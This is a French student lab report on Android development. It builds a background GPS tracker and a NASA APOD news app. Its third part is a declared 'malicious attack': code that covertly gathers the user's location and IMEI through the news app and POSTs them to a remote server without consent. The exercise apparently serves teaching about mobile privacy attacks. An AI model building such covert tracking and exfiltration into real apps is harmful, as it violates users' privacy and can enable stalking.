# RAPPORT

## Partie 1 : Traquer la position GPS

### 1. Création d'un application GPS en temps réel

L'objectif de cette partie est de concevoir une application qui releve les positions de l'utilisateur en temps réel et les affiche sur une carte. Une application donc a première vu innofensive, car nous utilisons des applications similaires pour nous reperer.

Pour ce faire, L'API Google Maps peut déterminer la position de l'utilisateur et la placer sur une carte GoogleMap de façon assez simple. Je n'ai pas rencontré de grosses difficultés à faire cette fonctionnalité car il y avait beaucoup de code exemple bien détaillé sur le net. Après avoir suivis les instructions de Google pour le téléchargement et la mise en marche  de l'API, voici les étapes par de la construction de monde code :

#### Récuperer la postion de l'utilisateur en temps réel

##### ajout des permissions
```java 
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
```


##### Récupération et affichage de la position de l'utilisateur
Pour récuperer la postion de l'utilisateur il faut utiliser la méthode `onLocationChanged` de l'interface LocationListener, on peut à partir de là récuperer la latitude et la longitude de la position de l'utilisateur et après afficher sur la carte avec un marqueur de la manière suivante :

```java
@Override
    public void onLocationChanged(Location location) {

        mMap.clear();
        gps = new LatLng(location.getLatitude(), location.getLongitude());
        mMap.addMarker(new MarkerOptions().position(gps).title("Point"));
        mMap.moveCamera(CameraUpdateFactory.newLatLng(gps));
        Toast.makeText(this, "Location Changed", Toast.LENGTH_SHORT).show();
    }
```

##### Affichage de la position en temps réel

Il fallait trouver un moyen de requêter sans arrêt la position de l'utilisateur pour pouvoir appeler la méthode ci dessus, cela ce fait simplement avec l'objet `LocationManager` :

```java
lm= (LocationManager) getSystemService(Context.LOCATION_SERVICE);
lm.requestLocationUpdates(GPS_PROVIDER, 0, 0, this);
```

### 2. Ecoute de la position en arrière plan 

Pour pouvoir faire des opérations en dehors de l'interaction de l'utilisateur, comme écouter la position GPS en arrière plan il fallait mettre en place un service. Je ne savais pas du tout comment marchait un service, c'est pour cela que ctte partie était un peu plus difficile. Heuresement, en plus de l'explication sur developer.android.com j'ai réussi à trouver un tuto et explication sur le fonctionnement d'un service avec un exemple directement en lien avec le service que je devais implémenter sur : 

https://nbenbourahla.developpez.com/tutoriels/android/services-sous-android/?fbclid=IwAR1Za-wyYneAkzBiZca186AFPdwhEdBm6ON6kwRoR31F3fv5oc3PpcU3u_A

La chose importante à retenir est qu'un service n'a pas de durée définie, il est là pour exécuter sa tâche et il fonctionnera tant que c'est nécessaire.

J'ai pu donc créer mon service à l'aide du tutoriel. Comme pour l'activité Maps il fallait que j'initialise un LocationListener et un LocationManager pour pouvoir récuperer les données de position en temps réel de l'utilisateur. J'utilisais alors un Toast pour voir que mon service marchait :

```java 
@Override
    public void onLocationChanged(Location location)
    {
      Double latitude = location.getLatitude();
      Double longitude = location.getLongitude();
 
      Toast.makeText(getBaseContext(),
      "Voici les coordonnées de votre téléphone : " + latitude + " " + longitude,
      Toast.LENGTH_LONG).show();
    }
 ```

A présent il fallait lancer le service sur le onCreate() de l'activité maps, je l'ai donc lancé de la façon suivante :
```java
Intent intent = new Intent(this, MyService.class);
startService(intent);
```
Et là, rien de marchait... En regardant plus attentivement le site de developer.android.com, j'ai vite compris que les dernières versions d'android que j'utilisais devait lancé un "service d'arrière plan" avec la méthode ``` startForeground().```dans le onCreate() du service. Cette méthode prend 2 paramètres : un integer qui identifie la notification et la Notification de la bar de status du téléphone. A l'aide d'exemple trouvé sur le net, voici ce que j'ai ajouté pour bien lancer mon service :

```java 

@Override
    public void onCreate() {
       // [...]
       
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
    }
    
    
    @RequiresApi(api = Build.VERSION_CODES.O)
    private void startMyOwnForeground(){
        String NOTIFICATION_CHANNEL_ID = "com.example.issarompion.gpstracker";
        String channelName = "My Background Service";
        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);
        chan.setLightColor(Color.BLUE);
        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        assert manager != null;
        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setSmallIcon(R.mipmap.ic_launcher)
                .setContentTitle("App is running in background")
                .setPriority(NotificationManager.IMPORTANCE_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .build();
        startForeground(2, notification);
    }
```

A présent mon service fonctionne convenablement, j'arrive à recuperer la localisation de l'utilisateur en arrière plan.

## Partie 2 : Ecrire une application de News

L'objectif de cette partie est de concevoir une application de News qui affiche les dernière photos postées par la NASA sur leur site. C'est sans doute la partie ou j'ai passé le plus de temps car il y avait pas mal de boulot à faire pour mettre en place cette application.

### 1. Recuperer les données de l'API APOD

Pour pouvoir récuperer une photo de l'API APOD d'un jour donnée, il faut requêter une URL (qui a une syntaxe particulière) qui nous renvoie un JSON contenant des informations sur la photo (dont la date, le titre et url de l'image en format jpg). Voici le code que j'ai utiliser (à l'aide d'internet) pour pouvoir recuperer les infos d'un jour donné :

```java 

JSONArray json;

public JSONArray getJSONArray(Date date) throws IOException{

        String endDate= new SimpleDateFormat("yyyy-MM-dd").format(date);
        String startDate = new SimpleDateFormat("yyyy-MM-dd").format(yesterday(date));

        String url = "https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY&start_date="+startDate+"&end_date="+endDate;


        URLConnection connection = new URL(url).openConnection();
        connection.connect();

        BufferedReader r  = new BufferedReader(new InputStreamReader(connection.getInputStream(), Charset.forName("UTF-8")));

        StringBuilder sb = new StringBuilder();
        String line;
        while ((line = r.readLine()) != null) {
            sb.append(line);
        }
        try {
            json = new JSONArray(sb.toString());
            System.out.println(json);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return json;
    }
    
    // JSON de l'image
    JSONObject jsonO = json.getJSONObject(0);
    
    // Informations importantes (date, titre et url de l'image)
    String date = jsonO.getString("date");
    String explanation = jsonO.getString("explanation");
    String imageUrl = jsonO.getString("url");
    
   ```
   
   ### 2. Ajout d'une image sur le layout
   
   Maintenant il faut pouvoir ajouter une image sur le layout dans l'ordre suivant : image, date et description. Il y avait plusieurs façons de procéder. J'ai décider d'utiliser une `Scollview` contenant un `LinearLayout`. La Scrollview me permettait de facillement gerer le scroll de l'activité tandis que le LinearLayout pouvait bien m'agencer les informations de façon linaire verticalement.
   
   ```java
   
   <ScrollView
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:id="@+id/scroll">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:id="@+id/ll"
            android:orientation="vertical"/>

    </ScrollView>
 ```
    
 Il fallait que mon programme puisse ajouter à l'interieur du LinearLayout les trois Views : TextView DateView, TextView ExpView, ImageView ImageView. J'ai donc créer la méthode `addItems(TextView DateView, TextView ExpView, ImageView ImageView)` que j'appelle dans le onCreate() de l'activité :
 
```java 
layout = (LinearLayout) findViewById(R.id.ll);
scroll = (ScrollView) findViewById(R.id.scroll);
DV = new TextView(this);
EV = new TextView(this);
IV = new ImageView(this);

date = new Date();

try { json = getJSONArray(date); } catch (IOException e) { e.printStackTrace(); }

try { addItems(DV, EV, IV);} catch (JSONException e) { e.printStackTrace(); }
        
public void addItems(TextView DateView, TextView ExpView, ImageView ImageView) throws JSONException {

            JSONObject jsonO = json.getJSONObject(0);

            String date = jsonO.getString("date");
            String explanation = jsonO.getString("explanation");
            String imageUrl = jsonO.getString("url");


            DateView.append(date);
            DateView.setGravity(Gravity.CENTER);
            DateView.setTextSize(TypedValue.COMPLEX_UNIT_SP,25);
            ExpView.append(explanation);
            ImageView.setImageDrawable(LoadImageFromWebOperations(imageUrl));

            layout.addView(ImageView);
            layout.addView(DateView);
            layout.addView(ExpView);

            DV = new TextView(this);
            EV = new TextView(this);
            IV = new ImageView(this);

        }
        
 public static Drawable LoadImageFromWebOperations(String url) {
        try {
            InputStream is = (InputStream) new URL(url).getContent();
            Drawable d = Drawable.createFromStream(is, "src name");
            return d;
        } catch (Exception e) {
            return null;
        }
    }
    
  ```

Cette méthode m'ajoute donc l'image, la date et le titre de la dernière photo d'APOD. A noté que je convertis l'url de l'image (jpg) en drawable pour pouvoir l'ajouter dans mon ImageView (voir fonction LoadImageFromWebOperations(String url))

### 3. Chargement de nouvelles photos lorsque l'utilisateur scroll vers le bas

Cette fonctionnalité se gère de manière simple avec une ScrollView qui a des méthodes pour ecouter les mouvements de scroll de l'utilisateur. Ainsi avec le booléen `!scroll.canScrollVertically(1)`je pouvais savoir si l'utilisateur ne pouvais plus scroller vers le bas (car arrivé au bout). Lorsque c'était le cas. je chargais une nouvelle image avec la date du jour d'avant avec la méthode `public Date yesterday(Date date)`. Voici le code qui me permete de charger de nouvelles photos lorsque que l'utilisateur scroll vers le bas :

```java

scroll = (ScrollView) findViewById(R.id.scroll);
DV = new TextView(this);
EV = new TextView(this);
IV = new ImageView(this);
date = new Date();

scroll.getViewTreeObserver().addOnScrollChangedListener(new ViewTreeObserver.OnScrollChangedListener() {
            @Override
            public void onScrollChanged() {
                if (!scroll.canScrollVertically(1)) {
                    // bottom of scroll view
                    date = yesterday(date);
                    try { json = getJSONArray(date); } catch (IOException e) { e.printStackTrace(); }
                    try { addItems(DV, EV, IV);} catch (JSONException e) { e.printStackTrace(); }
                }
                }
        });

public Date yesterday(Date date){
        Calendar calendar = Calendar.getInstance();
        calendar.setTime(date);
        calendar.add(Calendar.DATE, -1);
        return calendar.getTime();
    }
```

## Partie 3 : Collecter les données GPS de l'utilisateur

Cette dernière partie consitait à creer notre attaque malicieuse à savoir collecter les données GPS de l'utilisateur (sans son consentement) sur l'application News. Pour cela il fallait faire communiquer l'application GPS, qui arrive à traquer le position de l'utilisateur même en arrière plan, avec l'application de News.

### 1. Broadcast d'un intent à chaque nouvelle coordonées GPS sur l'application gpstracker

Sur le service il faut pouvoir envoyé un intent à l'application News. J'ai donc utilisé la fonction `sendBroadcast(Intent intent)`qui envoie un intent (en brodcast aux applications) contenant les données GPS dans un tableau.

```java 
String[] data = new String[2];
data[0]=latitude.toString();
data[1]=longitude.toString();
Intent intent = new Intent();
intent.addFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
intent.setAction("com.example.issarompion.broadcast");
intent.putExtra("position", data);
sendBroadcast(intent);
```


### 2. Creation du BroadcastReceiver sur L'application de News

Pour récuper les intents il faut créer un BroadcastReceiver qui est un objet qui receptionne les intents avec la méthode `onReceive(Context context, Intent intent)`. Ensuite j'ai décider de créer un JSON avec les données `imei`(récuperer sur l'activité MainActivity de la manière des TP précedant),`lat` et `lgn`pour l'envoie.

```java
public class MyReceiver extends BroadcastReceiver {
    

    public MyReceiver() {
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        //Toast.makeText(context, "Intent Detected.", Toast.LENGTH_LONG).show();
        String[] location = intent.getStringArrayExtra("position");

        JSONObject json = new JSONObject();
        try {
            json.put("imei",MainActivity.IMEI);
            JSONObject coordinates = new JSONObject();
            coordinates.put("lat",location[0]);
            coordinates.put("lng",location[1]);
            json.put("coordinates", coordinates);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
```

A noter qu'il faut ajouter le receiver dans le manifest de l'application de la manière suivante : 
```java
<receiver android:name="MyReceiver" >
            <intent-filter>
                <action android:name="com.example.issarompion.broadcast" >
                </action>
            </intent-filter>
        </receiver>
```

### 3. Envoie des données sur un serveur distant

Voilà la partie que j'ai trouvé la plus pénible à faire, j'ai passé beaucoup de temps (pour pas grand chose de difficle à faire en soit) à envoyer un POST http en java. Je trouve ça beaucoup plus lourd à écrire que sur javascript... Pour faire un post http sur android il faut utiliser l'objet AsyncHttpClient et pas HttpPost qui ne marche pas, pourquoi ? je ne sais toujours pas. Noté que pour pouvoir l'utilisé il fallait ajouter implementation `com.loopj.android:android-async-http:1.4.9`dans le gradle. Ensuite pour pouvoir poster un json il faut utiliser la méthode post de la façon suivante : 

```java
AsyncHttpClient asyncHttpClient = new AsyncHttpClient();
        StringEntity entity = null;
        try {
            entity = new StringEntity(json.toString());
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        asyncHttpClient.post(context,"http://10.0.2.2:8080/location",entity, "application/json", new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                String response = new String(responseBody); // this is your response string
                System.out.println("Success");
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                // Here you write code if there's error
                System.out.println("Failure");
            }
```

### 4. Reception et ecriture des données sur un serveur distant

A l'aide du TP precédant cette fonctionnalité fut assez simple à faire il suffisant d'ajouter le cas `app.post('/location', function(req,res) {[...]}` qui créait et ecrivait les données GPS dans un fichier texte.

